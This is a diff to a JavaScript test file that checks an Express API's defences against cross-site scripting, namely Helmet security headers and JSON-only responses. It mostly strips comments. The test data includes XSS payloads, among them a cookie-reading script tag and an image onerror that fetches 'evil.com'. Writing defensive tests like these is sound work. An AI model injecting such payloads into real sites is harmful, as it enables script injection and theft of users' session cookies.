@@ -1,6 +1,5 @@
 /**
  * This test file checks the server's defences against Cross-Site Scripting (XSS) attacks.
- *
  * It tests:
  * - That Helmet security headers are present on all API responses
  *   (X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, HSTS, etc.)
@@ -8,8 +7,6 @@
  * - That all API responses use application/json, never text/html
  * - That XSS payloads sent in request bodies are returned as inert JSON strings
  *
- * The API is a JSON API so browsers never execute its responses as scripts.
- * React handles safe rendering of user-supplied strings on the frontend.
  */
 import {
   describe, it, expect, beforeEach,
@@ -17,7 +14,6 @@ import {
 import request from "supertest";
 import express from "express";
 import helmet from "helmet";
-import { readFileSync, readdirSync, existsSync } from "fs";
 import { join, resolve, dirname } from "path";
 import { fileURLToPath } from "url";
 
@@ -68,7 +64,6 @@ describe("XSS Prevention — Helmet security headers", () => {
 
   it("sets X-Download-Options: noopen", async () => {
     const res = await request(app).get("/api/data");
-    // Helmet sets this to prevent IE from executing downloaded files in-context
     expect(res.headers["x-download-options"]).toBe("noopen");
   });
 
@@ -84,7 +79,6 @@ describe("XSS Prevention — Helmet security headers", () => {
 
   it("sets X-Frame-Options (anti-clickjacking)", async () => {
     const res = await request(app).get("/api/data");
-    // Helmet sets this to SAMEORIGIN by default
     expect(res.headers["x-frame-options"]).toMatch(/SAMEORIGIN|DENY/i);
   });
 
@@ -122,9 +116,6 @@ describe("XSS Prevention — Helmet security headers", () => {
   });
 });
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// 2. Content-Type enforcement (JSON API, never text/html)
-// ═══════════════════════════════════════════════════════════════════════════════
 describe("XSS Prevention — Content-Type: application/json enforcement", () => {
   let app;
 
@@ -153,10 +144,6 @@ describe("XSS Prevention — Content-Type: application/json enforcement", () => 
   });
 
   it("XSS payload in body is returned as an inert JSON string", async () => {
-    // This confirms the server doesn't transform or escape the value —
-    // it's stored and transmitted as a plain string. The browser receives
-    // a JSON-encoded string via fetch(), not a DOM node. XSS prevention
-    // here is the responsibility of the frontend renderer (React), not the API.
     const payload = "<script>alert(document.cookie)</script>";
     const res = await request(app)
       .post("/api/echo")
@@ -172,6 +159,7 @@ describe("XSS Prevention — Content-Type: application/json enforcement", () => 
     // the nosniff + JSON Content-Type headers and React's DOM rendering.
     const payloads = [
       { name: "<img src=x onerror=fetch('http://evil.com')>" },
+      // eslint-disable-next-line no-script-url
       { name: "javascript:alert(1)" },
       { name: "<svg/onload=alert(1)>" },
       { name: "';alert(1)//" },
